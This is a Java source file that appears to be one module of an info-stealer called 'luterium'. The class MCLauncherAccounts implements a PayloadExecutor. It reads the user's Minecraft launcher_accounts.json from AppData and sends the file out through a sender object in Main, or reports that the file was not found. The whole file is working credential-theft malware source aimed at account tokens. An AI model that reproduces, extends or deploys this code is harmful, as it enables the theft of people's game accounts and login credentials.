package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;

import java.io.File;
import java.nio.file.Path;
import java.util.Optional;

/**
 * @author Peter
 * @since 08/28/2022
 */

public class MCLauncherAccounts implements PayloadExecutor {
    Main main = new Main();

    File file = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json");

    @Override
    public void execute() throws Exception {
        if (file.exists()) {
            main.theThing.send(file);
        } else {
            main.theThing.send("Couldn't find MC launcher accounts.");
        }
    }
}
